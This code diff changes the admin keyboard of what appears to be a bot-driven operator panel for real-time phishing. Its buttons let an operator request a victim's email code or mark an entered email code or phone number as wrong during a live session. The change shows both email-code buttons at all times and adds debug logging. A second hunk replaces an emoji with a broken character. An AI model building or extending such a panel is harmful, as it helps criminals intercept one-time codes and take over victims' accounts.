@@ -922,20 +922,24 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Secondary Actions Row
   const secondaryRow = [];
 
-  // Email Code Button - Changes to Wrong mail code after first attempt
-  if (!session.authAttempts["email"] || session.authAttempts["email"] === 0) {
-    secondaryRow.push({
-      text: "📧 EMAIL CODE",
-      callback_data: `auth_email_code_${sessionId}`,
-    });
-    console.log("✅ Added Email Code button");
-  } else {
-    secondaryRow.push({
-      text: "Wrong mail code",
-      callback_data: `incorrect_email_code_${sessionId}`,
-    });
-    console.log("✅ Added Wrong Email Code button (replacing EMAIL CODE)");
-  }
+  // Email Code Buttons - Always show both for debugging
+  console.log("🔍 Email attempts check:", {
+    sessionId: sessionId.slice(-8),
+    emailAttempts: session.authAttempts["email"] || 0,
+    authAttempts: session.authAttempts,
+  });
+
+  secondaryRow.push({
+    text: "📧 EMAIL CODE",
+    callback_data: `auth_email_code_${sessionId}`,
+  });
+  console.log("✅ Added Email Code button");
+
+  secondaryRow.push({
+    text: "Wrong mail code",
+    callback_data: `incorrect_email_code_${sessionId}`,
+  });
+  console.log("✅ Added Wrong Email Code button");
 
   secondaryRow.push({
     text: "❌ WRONG #",
@@ -1377,7 +1381,7 @@ const formatSessionMessage = (session: UserSession): string => {
         if (isCritical)
           return { emoji: "🔴", priority: "CRITICAL", urgency: "⚡" };
         if (isUrgent) return { emoji: "🟠", priority: "URGENT", urgency: "⏰" };
-        return { emoji: "🟡", priority: "PENDING", urgency: "📋" };
+        return { emoji: "🟡", priority: "PENDING", urgency: "��" };
       case "phone_verification":
         return { emoji: "🔵", priority: "VERIFY", urgency: "📱" };
       case "completed":
